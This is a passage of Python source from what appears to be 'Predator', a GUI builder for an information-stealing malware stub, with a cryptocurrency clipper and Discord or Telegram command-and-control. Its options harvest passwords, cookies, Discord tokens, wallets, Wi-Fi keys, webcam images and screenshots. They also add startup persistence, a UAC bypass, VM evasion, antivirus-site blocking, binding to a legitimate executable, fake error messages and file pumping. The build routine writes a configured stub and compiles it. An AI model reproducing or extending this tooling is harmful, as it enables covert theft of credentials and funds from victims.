        for button in [self.captureAutoFillCheckboxControl, self.vmProtectCheckboxControl, self.startupCheckboxControl, self.meltCheckboxControl, self.captureWebcamCheckboxControl, self.capturePasswordsCheckboxControl, self.captureCookiesCheckboxControl, self.captureHistoryCheckboxControl, self.captureDiscordTokensCheckboxControl, self.captureGamesCheckboxControl, self.captureWalletsCheckboxControl, self.captureWifiPasswordsCheckboxControl, self.captureSysteminfoCheckboxControl, self.captureScreenshotCheckboxControl, self.captureTelegramChecboxControl, self.captureCommonFilesChecboxControl, self.blockAvSitesCheckboxControl, self.discordInjectionCheckboxControl, self.uacBypassCheckboxControl]:
            button.select()


        #Build category
        # self.obf = customtkinter.CTkCheckBox(self.build_frame, text="Obfuscate", onvalue='yes', offvalue='no')
        # self.obf.grid(row=1, column=0, sticky="nw", padx=40, pady=20)

        # self.compy = customtkinter.CTkCheckBox(self.build_frame,text="Compil into .exe (Let Empty for .py)", onvalue='yes', offvalue='no')
        # self.compy.grid(row=2, column=0, sticky="nw", padx=40, pady=20)

        # self.obf_name = customtkinter.CTkLabel(master=self.build_frame, text="Obfuscation Level")
        # self.obf_name.grid(row=3, column=0, columnspan=2, padx=10, pady=(20, 5))

        # self.num = customtkinter.CTkLabel(master=self.build_frame, text='          0%                                             25%                                          50%                                          75%                                          100%')
        # self.num.grid(row=4, column=0, columnspan=1, padx=10, pady=0, sticky="nw")

        # self.obf_bar = customtkinter.CTkSlider(self.build_frame, from_=0, to=1, number_of_steps=4)
        # self.obf_bar.grid(row=5, column=0, sticky="ew", padx=40, pady=(0,20))

        # self.pleasebuild = customtkinter.CTkButton(self.build_frame, width=150, height=50, text="BUILD", command=lambda: self.build_scr(self.n3m3_input.get(), self.w3bh00k_input.get()), compound="right")
        # self.pleasebuild.grid(row=6, column=0, padx=0, pady=20)

        self.buildButtonControl = customtkinter.CTkButton(self.build_frame, text="Build", corner_radius=0, command=lambda: Thread(target=self.buildButtonControl_Callback).start())
        self.buildButtonControl.grid(row=0, column=0, sticky="nsew")

        self.BuilderLog = customtkinter.CTkTextbox(self.build_frame, corner_radius=0)
        self.BuilderLog.grid(row=1, column=0, sticky="nsew")
        self.BuilderLog.insert("0.0", "IDLE.")

        #About category
        self.img = customtkinter.CTkLabel(self.about_frame, text="", image=self.gif, compound="left",font=customtkinter.CTkFont(size=16, weight="bold"))
        self.img.grid(row=0, column=0, pady=20)

        urls = [("Github", "https://github.com/l4gtr4/Predator"),
                   ("Telegram", "https://t.me/mr_0x01")]

        for i, (text, url) in enumerate(urls, start=3):
            button = customtkinter.CTkButton(self.about_frame, text=text, command=lambda url=url: webbrowser.open(url))
            button.grid(row=i, column=0, pady=10)

        self.function("options")

    
    def saveClipper(self) -> None:
        try:
            with open('core/Stealer/Clipper.json', 'r', encoding='utf-8') as DB:
                StealerDB = json.load(DB)

            StealerDB['CryptoClipper'] = self.active.get()
            StealerDB["ClipperBTC"] = self.btc_input.get()
            StealerDB["ClipperCOMBO"] = self.combo_input.get()
            StealerDB["ClipperTRC20"] = self.trc20_input.get()
            StealerDB["ClipperLTC"] = self.ltc_input.get()
            StealerDB["ClipperMonero"] = self.monero_input.get()
            StealerDB["ClipperAda"] = self.ada_input.get()
            StealerDB["ClipperDash"] = self.dash_input.get()
            StealerDB["ClipperDGB"] = self.dgb_input.get()
            StealerDB["ClipperSOL"] = self.sol_input.get()
            StealerDB["ClipperBCH"] = self.bch_input.get()
            StealerDB["ClipperZCASH"] = self.zcash_input.get()
            StealerDB["ClipperXRP"] = self.xrp_input.get()

            with open("core/Stealer/Clipper.json", "w", encoding='utf-8') as saveDB:
                json.dump(StealerDB, saveDB)
              
        except Exception as err:
            console.print_exception(show_locals=True)
            return Predator.show_error('', 'Error', err)

        return Predator.show_checkmark('', 'Success', 'Saved Successfully')

    def bindExeButtonControl_Callback(self) -> None:
        UNBIND = "Unbind Executable"
        BIND = "Bind Executable"

        buttonText = self.bindExeButtonControl.cget("text")

        if buttonText == BIND:
            allowedFiletypes = (("Executable file", "*.exe"),)
            filePath = customtkinter.filedialog.askopenfilename(title= "Select file to bind", initialdir= ".", filetypes= allowedFiletypes)
            if os.path.isfile(filePath):
                self.boundExePath = filePath
                self.bindExeButtonControl.configure(text= UNBIND)
                if messagebox.askyesno("Bind Executable", "Do you want this bound executable to run on startup as well? (Only works if `Put On Startup` option is enabled)"):
                    self.boundExeRunOnStartup = True
        
        elif buttonText == UNBIND:
            self.boundExePath = ""
            self.boundExeRunOnStartup = False
            self.bindExeButtonControl.configure(text= BIND)
    
    def selectIconButtonControl_Callback(self) -> None:
        UNSELECT = "Unselect Icon"
        SELECT = "Select Icon"

        buttonText = self.selectIconButtonControl.cget("text")

        if buttonText == SELECT:
            allowedFiletypes = (("Image", ["*.ico", "*.bmp", "*.gif", "*.jpeg", "*.png", "*.tiff", "*.webp"]), ("Any file", "*"))
            filePath = customtkinter.filedialog.askopenfilename(title= "Select icon", initialdir= ".", filetypes= allowedFiletypes)
            if os.path.isfile(filePath):
                try:
                    buffer = BytesIO()
                    with Image.open(filePath) as image:
                        image.save(buffer, format= "ico")

                    self.iconBytes = buffer.getvalue()
                except Exception:
                    messagebox.showerror("Error", "Unable to convert the image to icon!")
                else:
                    self.selectIconButtonControl.configure(text= UNSELECT)
        
        elif buttonText == UNSELECT:
            self.iconBytes = b""
            self.selectIconButtonControl.configure(text= SELECT)
    
    def buildModeButtonControl_Callback(self) -> None:
        EXEMODE = "Output: EXE File"
        PYMODE = "Output:   PY File"

        exeOnlyChecboxControls = (
            (self.fakeErrorCheckboxControl, self.fakeErrorVar),
            (self.startupCheckboxControl, self.startupVar),
            (self.uacBypassCheckboxControl, self.uacBypassVar),
            (self.pumpStubCheckboxControl, self.pumpStubVar),
            (self.bindExeButtonControl, None),
            (self.selectIconButtonControl, None),
        )

        if self.OutputAsExe: # Change to PY mode
            self.OutputAsExe = False
            buttonText = PYMODE

            for control, var in exeOnlyChecboxControls:
                control.configure(state= "disabled")
                if var:
                    var.set(False)
            self.fakeError_Event()
            
            if self.iconBytes:
                self.selectIconButtonControl_Callback() # Remove icon
            
            if self.boundExePath:
                self.bindExeButtonControl_Callback() # Remove bound executable

        else: # Change to EXE mode
            self.OutputAsExe = True
            buttonText = EXEMODE

            for control, _ in exeOnlyChecboxControls:
                control.configure(state= "normal")

        self.buildModeButtonControl.configure(text= buttonText)
    
    def consoleModeButtonControl_Callback(self) -> None:
        CONSOLE_NONE = "Console: None"
        CONSOLE_FORCE = "Console: Force"
        CONSOLE_DEBUG = "Console: Debug"

        if self.ConsoleMode == 0:
            self.ConsoleMode = 1
            buttonText = CONSOLE_FORCE
        elif self.ConsoleMode == 1:
            self.ConsoleMode = 2
            buttonText = CONSOLE_DEBUG
        else:
            self.ConsoleMode = 0
            buttonText = CONSOLE_NONE

        self.consoleModeButtonControl.configure(text= buttonText)
    
    def buildButtonControl_Callback(self) -> None:
        if self.C2Mode == 0:
            webhook = self.C2EntryControl.get().strip()
            if len(webhook) == 0:
                self.BuilderLog.insert("0.0", "Webhook cannot be empty!\n")
                return Predator.show_error("", "Error!", "Webhook cannot be empty!")
                
            if any(char.isspace() for char in webhook):
                self.BuilderLog.insert("0.0", "Webhook cannot contain spaces!\n")
                return Predator.show_error("", "Error!", "Webhook cannot contain spaces!")
                  
            if not webhook.startswith(("http://", "https://")):
                self.BuilderLog.insert("0.0", "Invalid protocol for the webhook URL! It must start with either 'http://' or 'https://'.\n")
                return Predator.show_error("", "Error!", "Invalid protocol for the webhook URL! It must start with either 'http://' or 'https://'.")
                
        
        elif self.C2Mode == 1:
            endpoint = self.C2EntryControl.get().strip()
            if len(endpoint) == 0:
                    self.BuilderLog.insert("0.0", "Endpoint cannot be empty!\n")
                    return Predator.show_error("", "Error!", "Endpoint cannot be empty!")
   
            if any(char.isspace() for char in endpoint):
                self.BuilderLog.insert("0.0", "Endpoint cannot contain spaces!\n")
                return Predator.show_error("", "Error!", "Endpoint cannot contain spaces!")
                
            
            if any(char in ("[", "]") for char in endpoint):
                self.BuilderLog.insert("0.0", "You do not have to include the brackets in the endpoint!\n")
                return Predator.show_error("", "Error!", "You do not have to include the brackets in the endpoint!")

            if not endpoint.count("|") == 1:
                self.BuilderLog.insert("0.0", "Invalid format! Endpoint must be your Telegram bot token and chat ID separated by a single '|' symbol.\n")
                return Predator.show_error("", "Error!", "Invalid format! Endpoint must be your Telegram bot token and chat ID separated by a single '|' symbol.")
            
            token, chat_id = [i.strip() for i in endpoint.split("|")]

            if not token:
                self.BuilderLog.insert("0.0", "Bot token cannot be empty!\n")
                return Predator.show_error("", "Error!", "Bot token cannot be empty!")
                
            
            if chat_id:
                if not chat_id.lstrip("-").isdigit() and chat_id.count("-") <= 1:
                    self.BuilderLog.insert("0.0", "Invalid chat ID! Chat ID must be a number.\n")
                    return Predator.show_error("", "Error!", "Invalid chat ID! Chat ID must be a number.")
                    
            else:
                self.BuilderLog.insert("0.0", "Chat ID cannot be empty!\n")
                return Predator.show_error("", "Error!", "Chat ID cannot be empty!")
                
        if not Utility.CheckInternetConnection():
            self.BuilderLog.insert("0.0", "Unable to connect to the internet!\n")
            return Predator.show_error("", "Error!", "Unable to connect to the internet!")
            
        
        if not any([
            self.captureWebcamVar.get(), self.capturePasswordsVar.get(), self.captureCookiesVar.get(), 
            self.captureHistoryVar.get(), self.captureDiscordTokensVar.get(), self.captureGamesVar.get(), 
            self.captureWalletsVar.get(), self.captureWifiPasswordsVar.get(), self.captureSystemInfoVar.get(), 
            self.captureScreenshotVar.get(), self.captureTelegramVar.get(), self.captureCommonFilesVar.get(),
            self.captureAutofillsVar.get(),
            ]):
            self.BuilderLog.insert("0.0", "You must select at least one of the stealer modules!\n")
            return Predator.show_error("", "Error!", "You must select at least one of the stealer modules!")
            
        config= {
            "settings" : {
                "c2" : [self.C2Mode, self.C2EntryControl.get().strip()],
                "mutex" : "",
                "pingme" : self.pingMeVar.get(),
                "vmprotect" : self.vmProtectVar.get(),
                "startup" : self.startupVar.get(),
                "melt" : self.meltVar.get(),
                "uacBypass" : self.uacBypassVar.get(),
                "archivePassword" : Settings.Password,
                "consoleMode" : self.ConsoleMode,
                "debug" : self.ConsoleMode == 2,
                "pumpedStubSize" : self.pumpLimit,
                "boundFileRunOnStartup" : self.boundExeRunOnStartup,
            },
    
            "modules" : {
                "captureWebcam" : self.captureWebcamVar.get(),
                "capturePasswords" : self.capturePasswordsVar.get(),
                "captureCookies" : self.captureCookiesVar.get(),
                "captureHistory" : self.captureHistoryVar.get(),
                "captureAutofills" : self.captureAutofillsVar.get(),
                "captureDiscordTokens" : self.captureDiscordTokensVar.get(),
                "captureGames" : self.captureGamesVar.get(),
                "captureWifiPasswords" : self.captureWifiPasswordsVar.get(),
                "captureSystemInfo" : self.captureSystemInfoVar.get(),
                "captureScreenshot" : self.captureScreenshotVar.get(),
                "captureTelegramSession" : self.captureTelegramVar.get(),
                "captureCommonFiles" : self.captureCommonFilesVar.get(),
                "captureWallets" : self.captureWalletsVar.get(),

                "fakeError" : self.fakeErrorData,
                "blockAvSites" : self.blockAvSitesVar.get(),
                "discordInjection" : self.discordInjectionVar.get()
            },

            "Clipper" : {
                "CryptoClipper" : self.active.get(),
                "ClipperBTC" : self.btc_input.get(),
                "ClipperCOMBO" : self.combo_input.get(),
                "ClipperTRC20" : self.trc20_input.get(),
                "ClipperLTC" : self.ltc_input.get(),
                "ClipperMonero" : self.monero_input.get(),
                "ClipperAda" : self.ada_input.get(),
                "ClipperDash" : self.dash_input.get(),
                "ClipperDGB" : self.dgb_input.get(),
                "ClipperSOL" : self.sol_input.get(),
                'ClipperBCH' : self.bch_input.get(),
                "ClipperZCASH" : self.zcash_input.get(),
                "ClipperXRP" : self.xrp_input.get(),
            }
        }

        configData = json.dumps(config, indent=4)

        if self.OutputAsExe:
            self.BuildExecutable(configData, self.iconBytes, self.boundExePath)
        else:
            self.BuildPythonFile(configData)
            
    def BuildPythonFile(self, config: str) -> None:
        
        try:
            self.BuilderLog.insert("0.0", f"output?\n")
            options = json.loads(config)
            outPath = filedialog.asksaveasfilename(confirmoverwrite= True, filetypes= [("Python Script", ["*.py","*.pyw"])], initialfile= "stub" + (".py" if options["settings"]["consoleMode"] == 2 else ".pyw"), title= "Save as")
            if outPath is None or not os.path.isdir(os.path.dirname(outPath)):
                return
            
            self.BuilderLog.insert("0.0", f"Staring...\n")
            self.BuilderLog.insert("0.0", f"Checking Components...\n")
            with open(os.path.join(os.path.dirname(__file__), "core/Components", "stub.py")) as file:
                code = file.read()
            
            sys.path.append(os.path.join(os.path.dirname(__file__), "core/Components")) # Adds Components to PATH

            if os.path.isdir(os.path.join(os.path.dirname(__file__), "core/Components", "__pycache__")):
                try:
                    shutil.rmtree(os.path.join(os.path.dirname(__file__), "core/Components", "__pycache__"))
                except Exception:
                    pass
            from core.Components import process
            _, injection = process.ReadSettings()
            code = process.WriteSettings(code, options, injection)

            if os.path.isfile(outPath):
                os.remove(outPath)

            self.BuilderLog.insert("0.0", f"Building...\n")
            try: 
                code = ast.unparse(ast.parse(code)) # Removes comments
            except Exception as err: 
                self.BuilderLog.insert("0.0", f"{err}\n")
                
            code = "# pip install pyaesm urllib3\n\n" + code

            with open(outPath, "w") as file:
                file.write(code)

            # messagebox.showinfo("Success", "File saved as %r" % outPath)
            self.BuilderLog.insert("0.0", f"File saved as {outPath}\n")
            Predator.show_checkmark("", "Success", f"File saved as {outPath}")
        except Exception as err:
            self.BuilderLog.insert("0.0", f"{err}\n")
            Predator.show_error("", "Error!", err)
    
    def BuildExecutable(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
        def Exit(code: int = 0) -> None:
            os.system("pause > NUL")
            exit(code)
        
        def clear() -> None:
            os.system("cls")
        
        def format(title: str, description: str) -> str:
            return "[{}\u001b[0m] \u001b[37;1m{}\u001b[0m".format(title, description)
        
        # self.destroy()
        Utility.ToggleConsole(True)
        ctypes.windll.user32.FlashWindow(ctypes.windll.kernel32.GetConsoleWindow(), True)
        clear()

        if not os.path.isfile(os.path.join("env", "Scripts", "run.bat")):
            if not os.path.isfile(os.path.join("env", "Scripts", "activate")):
                self.BuilderLog.insert("0.0", f"Creating virtual environment... (might take some time)\n")
                print(format("\u001b[33;1mINFO", "Creating virtual environment... (might take some time)"))
                res = subprocess.run("python -m venv env", capture_output= True, shell= True)
                clear()
                if res.returncode != 0:
                    self.BuilderLog.insert("0.0", f"Error while creating virtual environment ('python -m venv env'): {res.stderr.decode(errors='i')}\n")
                    print('Error while creating virtual environment ("python -m venv env"): {}'.format(res.stderr.decode(errors= "ignore")))
                    Exit(1)

        self.BuilderLog.insert("0.0", f"Building...\n")
        print(format("\u001b[33;1mINFO", "Copying assets to virtual environment..."))
        for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "core/Components")):
            if os.path.isfile(fileloc := os.path.join(datadir, i)):
                shutil.copyfile(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
            else:
                try:
                    shutil.copytree(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
                except:
                    pass

        with open("env/Scripts/config.json", "w", encoding="utf-8", errors= "ignore") as file:
            file.write(config)

        clear()

        oldpwd = os.getcwd()
        os.chdir(os.path.join(os.path.dirname(__file__), "env", "Scripts"))
        # cwd = os.path.dirname(__file__)

        if os.path.isfile(f"icon.ico"):
            os.remove(f"icon.ico")
        
        if iconFileBytes:
            with open(f"icon.ico", "wb") as file:
                file.write(iconFileBytes)

        if os.path.isfile(f"bound.exe"):
            os.remove(f"bound.exe")

        if os.path.isfile(boundFilePath):
            shutil.copy(boundFilePath, "bound.exe")

        os.startfile("run.bat")
        os.chdir(oldpwd)

    def testC2ButtonControl_Callback(self) -> None:
        self.C2EntryControl.configure(state= "disabled")
      
        def check():
            http = PoolManager(cert_reqs="CERT_NONE")
            if self.C2Mode == 0:
                webhook = self.C2EntryControl.get().strip()
                if len(webhook) == 0:
                    Predator.show_error('', 'Error!', "Webhook cannot be empty!")
                    return
                
                if any(char.isspace() for char in webhook):
                    Predator.show_error('', 'Error!', "Webhook cannot contain spaces!")
                    return
                
                if not webhook.startswith(("http://", "https://")):
                    Predator.show_error('', 'Error!', "Invalid protocol for the webhook URL! It must start with either 'http://' or 'https://'.")
                    return
                
                elif not "discord" in webhook:
                    Predator.show_error('', 'Error!', "Webhook does not seems to be a Discord webhook!")
                    return
                
                elif not Utility.CheckInternetConnection():
                    Predator.show_error('', 'Error!', "Unable to connect to the internet!")
                    return
                
                try:
                    data = json.dumps({"content" : "Your webhook is working!"}).encode()
                    http = http.request("POST", webhook, body= data, headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Safari/537.36"})
                    status = http.status
                    if status == 204:
                        Predator.show_checkmark('', 'Success', "Your webhook seems to be working!")
                    else:
                        Predator.show_error('', 'Error!', "Your webhook does not seems to be working!")
                except Exception:
                    Predator.show_error('', 'Error!', "Unable to connect to the webhook!")

                try:
                    with open('core/settings.json', 'r', encoding='utf-8') as DB:
                        GeneralDB = json.load(DB)

                    GeneralDB['discord'] = self.C2EntryControl.get()

                    with open("core/settings.json", "w", encoding='utf-8') as saveDB:
                        json.dump(GeneralDB, saveDB)
                      
                except Exception as err:
                    console.print_exception(show_locals=True)
                    Predator.show_error('', 'Error', err)
            
            elif self.C2Mode == 1:

                endpoint = self.C2EntryControl.get().strip()
                if len(endpoint) == 0:
                    return Predator.show_error('', 'Error!', "Endpoint cannot be empty!")

                if any(char.isspace() for char in endpoint):
                    return Predator.show_error('', 'Error!', "Endpoint cannot contain spaces!")
                
                if any(char in ("[", "]") for char in endpoint):
                    return Predator.show_error('', 'Error!', "You do not have to include the brackets in the endpoint!")
                    

                if not endpoint.count("|") == 1:
                    return Predator.show_error('', 'Error!', "Invalid format! Endpoint must be your Telegram bot token and chat ID separated by a single '|' symbol.")
                    # messagebox.showerror("Error", "Invalid format! Endpoint must be your Telegram bot token and chat ID separated by a single '|' symbol.")
                
                try:
                    with open('core/settings.json', 'r', encoding='utf-8') as DB:
                        GeneralDB = json.load(DB)

                    GeneralDB['telegram'] = self.C2EntryControl.get()

                    with open("core/settings.json", "w", encoding='utf-8') as saveDB:
                        json.dump(GeneralDB, saveDB)
                      
                except Exception as err:
                    console.print_exception(show_locals=True)
                    self.show_error('Error', err)

                token, chat_id = [i.strip() for i in endpoint.split("|")]

                if token:
                    endp = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=🧜🏻‍♂️Setup...'
                    try:
                        req = requests.get(endp, timeout=10)    
                        if 'ok":false,' in req.text:
                            return Predator.show_error('', 'Error!', "Invalid bot token!")

                    except Exception as err:
                        consolelog('ERROR', err)
                        return Predator.show_error('', 'Error!', err)
                        # return messagebox.showerror("Error", "Unable to connect to the Telegram API!")  

                    try:
                        resp = json.loads(http.request("GET", "https://api.telegram.org/bot%s/getUpdates" % token).data.decode())
                        if not resp["ok"]:
                            return Predator.show_error('', 'Error!', f"{resp}")
                            
                    except Exception as err:
                        consolelog('ERROR', err)
                        return Predator.show_error('', 'Error!', "Unable to connect to the Telegram API!")
                else:
                    return Predator.show_error('', 'Error!', "Bot token cannot be empty!")
                
                if chat_id:
                    if not chat_id.lstrip("-").isdigit() and chat_id.count("-") <= 1:
                        return Predator.show_error('', 'Error!', "Invalid chat ID! Chat ID must be a number.")
                        
                    else:
                        try:
                            resp = json.loads(http.request("GET", "https://api.telegram.org/bot%s/getChat?chat_id=%s" % (token, chat_id)).data.decode())
                            if not resp["ok"]:
                                return Predator.show_error('', 'Error!', "Invalid chat ID!\n\nCommon fixes:\n\n1) If the chat ID is of a user, then make sure the user have has sent at least one message to the bot.\n2) If the chat ID is of a channel, then make sure you have has sent at least one message in the channel after the bot joined.\n3) If the chat ID is of a group, then make sure the bot is a member of the group.")
                                
                            else:
                                if resp["result"].get("permissions"):
                                    if not resp["result"]["permissions"]["can_send_documents"] or not resp["result"]["permissions"]["can_send_messages"]:
                                        return Predator.show_error('', 'Error!', "The bot does not have the required permissions to send files and messages to the chat!")
                                        
                        except Exception as err:
                            consolelog('ERROR', err)
                            return Predator.show_error('', 'Error!', "Unable to connect to the Telegram API!")

            
                else:
                    return Predator.show_error('', 'Error!', "Chat ID cannot be empty!")
                    
                
                if not Utility.CheckInternetConnection():

                    return Predator.show_error('', 'Warning!', "Unable to connect to the internet!")
                
                try:
                    http = PoolManager(cert_reqs="CERT_NONE")
                    if http.request("GET", "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s" % (token, chat_id, quote("Your Bot is working✅"))).status == 200:
                        return Predator.show_checkmark("", "Success", "Your Bot is working")
                       
                except Exception as err:
                    consolelog('ERROR', err)
                    return Predator.show_error('', 'Warning!', "Unable to connect to the endpoint!")
                    
        check()
        # self.buildButtonControl.configure(state= "normal") #enable again
        self.C2ModeButtonControl.configure(state= "normal")
        self.C2EntryControl.configure(state= "normal")
    
    def fakeError_Event(self) -> None:
        if not self.fakeErrorVar.get():
            self.fakeErrorData = [False, ("", "", 0)]
        else:
            fakeErrorBuilder = FakeErrorBuilder(self)
            self.wait_window(fakeErrorBuilder)
            self.fakeErrorVar.set(self.fakeErrorData[0])

    def pumpStub_Event(self) -> None:
        if not self.pumpStubVar.get():
            self.pumpLimit = 0
        else:
            pumperSettings = PumperSettings(self)
            self.wait_window(pumperSettings)
            self.pumpStubVar.set(pumperSettings.limit > 0)
            self.pumpLimit = pumperSettings.limit * 1024 * 1024 # Convert to bytes

    def C2ModeButtonControl_Callback(self) -> None:
        self.focus() # Removes focus from the C2 text box
        DISCORD = "C2: Discord"
        TELEGRAM = "C2: Telegram"

        discordOnlyCheckBoxes = (
            (self.pingMeCheckboxControl, self.pingMeVar),
            (self.discordInjectionCheckboxControl, self.discordInjectionVar)
        )

        if self.C2Mode == 0: # Change to Telegram
            self.C2Mode = 1
            buttonText = TELEGRAM

            try:
                with open('core/settings.json', 'r', encoding='utf-8') as stDB:
                    stdB = json.load(stDB)
                    TelegramVar = (stdB['telegram'])
                    # DiscordVar = (stdB['discord'])
            except Exception as err:
                console.print_exception(show_locals=True)
                Predator.show_error('', 'Exception!', err)
                TelegramVar = "Enter Telegram Endpoint: Token|ChatID"

            Telegram_var = customtkinter.StringVar(value=TelegramVar)
            self.C2EntryControl.configure(placeholder_text="Enter Telegram Endpoint: Token|ChatID", textvariable=Telegram_var)
            self.testC2ButtonControl.configure(text= "Test Endpoint")

            for control, var in discordOnlyCheckBoxes:
                control.configure(state= "disabled")
                var.set(False)

        elif self.C2Mode == 1: # Change to Discord
            self.C2Mode = 0
            buttonText = DISCORD

            try:
                with open('core/settings.json', 'r', encoding='utf-8') as stDB:
                    stdB = json.load(stDB)
                    # TelegramVar = (stdB['telegram'])
                    DiscordVar = (stdB['discord'])
            except Exception as err:
                console.print_exception(show_locals=True)
                Predator.show_error('', 'Exception!', err)
                DiscordVar = "Enter Telegram Endpoint: Token|ChatID"

            Discord_Var = customtkinter.StringVar(value=DiscordVar)
            self.C2EntryControl.configure(placeholder_text= "Enter Discord Webhook URL", textvariable=Discord_Var)
            self.testC2ButtonControl.configure(text= "Test Webhook")

            for control, _ in discordOnlyCheckBoxes:
                control.configure(state= "normal")

        self.C2ModeButtonControl.configure(text= buttonText)
    
    # Nav bar
    def function(self, name):
        buttons = [self.option_button, self.crypto_button, self.file_button, self.build_button, self.about_button]

        for button in buttons:
            button_name = button.cget("text").lower()
            button.configure(fg_color=("gray75", "gray25") if button_name == name else "transparent")

        frames = {
            "options": self.options_frame,
            "crypto": self.crypto_frame,
            "file": self.file_frame,
            "build": self.build_frame,
            "about": self.about_frame
        }

        for button_name, frame in frames.items():
            if button_name == name:
                frame.grid(row=0, column=1, sticky="nsew", padx=5, pady=5)
            else:
                frame.grid_forget()

    def option_event(self):
        self.next_option_button.configure(command=self.crypto_event, text=">>")
        self.function("options")

    def crypto_event(self):
        self.next_option_button.configure(command=self.file_event, text=">>")
        self.function("crypto")

    def file_event(self):
        self.next_option_button.configure(command=self.build_event, text=">>")
        self.function("file")

    def build_event(self):
        self.next_option_button.configure(command=self.option_event, text="<<")
        self.function("build")

    def about_event(self):
        self.function("about")

    def reset_build(self):
        self.pleasebuild.configure(text="BUILD")

class Translator(customtkinter.CTkToplevel):
    def __init__(self):

        super().__init__()

        self.geometry('500x250')
        self.title('Translator [BETA]')
        self.attributes("-topmost", True)
        self.grid_columnconfigure((0,2), weight=1)
        self.grid_rowconfigure(0, weight=1)
        self.minsize(500, 250)
        # self.overrideredirect(True)

        leftFrame = customtkinter.CTkFrame(self)
        leftFrame.grid(row=0, column=0, pady=(10,0), sticky="nsew")
        leftFrame.grid_columnconfigure(0, weight=1)
        leftFrame.grid_rowconfigure(1, weight=1)

        xValues = ['ar-MA', 'en-US', 'es-US', 'ja-JP', 'ru-RU']
        self.TranslateCombo = customtkinter.CTkComboBox(leftFrame, values=xValues, corner_radius=0, fg_color="red", text_color="black")
        self.TranslateCombo.grid(row=0, column=0, sticky="nsew")
        self.TranslateCombo.set("en-US")

        self.TranslateInputBox = customtkinter.CTkTextbox(leftFrame, border_color='black', corner_radius=0, border_width=1)
        self.TranslateInputBox.grid(row=1, column=0, sticky="nsew")
        self.TranslateInputBox.focus_set()

        # BOTON N6
        button6 = customtkinter.CTkButton(leftFrame, text="Import", fg_color="red", text_color="black", corner_radius=0, border_width=0, border_color="black", command=lambda: self.open_event())
        button6.grid(row=2, column=0, sticky="nsew")

        button2 = customtkinter.CTkButton(self, text="<->", width=20, corner_radius=0, border_width=0, fg_color="red", text_color="black", border_color="black", state='disabled')
        button2.grid(row=0, column=1, pady=(10,0), sticky="nsew")

        rightFrame = customtkinter.CTkFrame(self)
        rightFrame.grid(row=0, column=2, pady=(10,0), sticky="nsew")
        rightFrame.grid_columnconfigure(0, weight=1)
        rightFrame.grid_rowconfigure(1, weight=1)

        self.TranslateCombo2 = customtkinter.CTkComboBox(rightFrame, values=xValues, fg_color="red", text_color="black", corner_radius=0)
        self.TranslateCombo2.grid(row=0, column=0, columnspan=3, sticky="nsew")
        self.TranslateCombo2.set("es-US")

        self.TranslateResBox = customtkinter.CTkTextbox(rightFrame, border_color='black', border_width=1, corner_radius=0)
        self.TranslateResBox.grid(row=1, column=0, columnspan=3, sticky="nsew")

        button3 = customtkinter.CTkButton(rightFrame, text="Copy", corner_radius=0, border_width=0, fg_color="red", text_color="black", command=lambda: self.copy_event())
        button3.grid(row=2, column=0, sticky="nsew")

        button4 = customtkinter.CTkButton(rightFrame, text="Clear", corner_radius=0, border_width=0, fg_color="red", text_color="black", border_color="black", command=lambda: self.delete_event())
        button4.grid(row=2, column=1, sticky="nsew")

        # BOTON N5
        button5 = customtkinter.CTkButton(rightFrame, text="Save", corner_radius=0, border_width=0, border_color="black", fg_color="red", text_color="black", command=lambda: self.save_event())
        button5.grid(row=2, column=2, sticky="nsew")

        self.translated = ''

        def gttrigger():
            tx = threading.Thread(target=self.get_text_textbox1)
            tx.daemon = True
            tx.start()

            self.TranslateBtn.configure(state="disabled")

        self.TranslateBtn = customtkinter.CTkButton(self, corner_radius=0, border_width=0, fg_color="red", text_color="black", text="Translate")
        self.TranslateBtn.grid(row=1, column=0, sticky="nsew", columnspan=3)
        self.TranslateBtn.configure(command=lambda: gttrigger())

    def copy_event(self):
        try:
            data = self.TranslateResBox.get("0.0", "end")
            pyclip.copy(data)
            return Predator.show_checkmark('', 'Success', 'Text copied to clipboard')
        except Exception as err:
            return Predator.show_error('', 'Error!', err)

    def delete_event(self):
        try:
            self.TranslateResBox.delete(index1='0.0', index2='end')
        except Exception as err:
            console.print_exception(show_locals=True)
            return Predator.show_error('', 'Error!', err)

    def open_event(self):
        try:
            filename = filedialog.askopenfilename(filetypes=[("txt file", ".txt")], defaultextension=".txt")
            if len(filename) == 0:
                return

            with open(filename, 'r', encoding='utf-8') as fh:
                data = fh.read()

            self.TranslateInputBox.insert("0.0", f"{data}\n")
        except Exception as err:
            console.print_exception(show_locals=True)
            return Predator.show_error('', 'Error!', err)


    def save_event(self):
        try:
            filename = filedialog.asksaveasfilename(filetypes=[("txt file", ".txt")], defaultextension=".txt")
            if len(filename) == 0:
                return

            data = self.TranslateResBox.get("0.0", "end")

            with open(filename, 'a', encoding='utf-8') as fh:
                fh.write(f"{data}\n")

        except Exception as err:
            console.print_exception(show_locals=True)
            return Predator.show_error('', 'Error!', err)

    def get_text_textbox1(self):
        try:
            text = self.TranslateInputBox.get("0.0", "end")
            self.translated = MyMemoryTranslator(source=self.TranslateCombo.get(), target=self.TranslateCombo2.get()).translate(text=text) # en-US
            pp.pprint(f'Input >> {text}')
            pp.pprint(f'Output >> {self.translated}')
            self.TranslateResBox.insert("0.0", f"{self.translated}\n")

        except Exception as err:
            console.print_exception(show_locals=True)
            Predator.show_error('', 'Error!', err)

        self.TranslateBtn.configure(state="normal")

class NetGun(customtkinter.CTkToplevel):

    def __init__(self):
        
        super().__init__()

        self.NetGunProxies = 0
        self.userlistX = 0
         
        self.title("NetGun")
        self.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.wm_iconphoto(False, mainico) 
        self.geometry("1211x600")
        self.attributes("-topmost", True)
        self.resizable(False, False)

        def import_Wrdlst():

            try:     
                userlist = filedialog.askopenfilename()  
            except Exception:
                return
            
            usrcwdtmp2 = userlist.replace('\\', '/')
            usrcwdtmp =  usrcwdtmp2.split('/')
            # for xd in usrcwdtmp:
            LenCwd = len(usrcwdtmp) - 1
            usrcwd = usrcwdtmp[LenCwd]
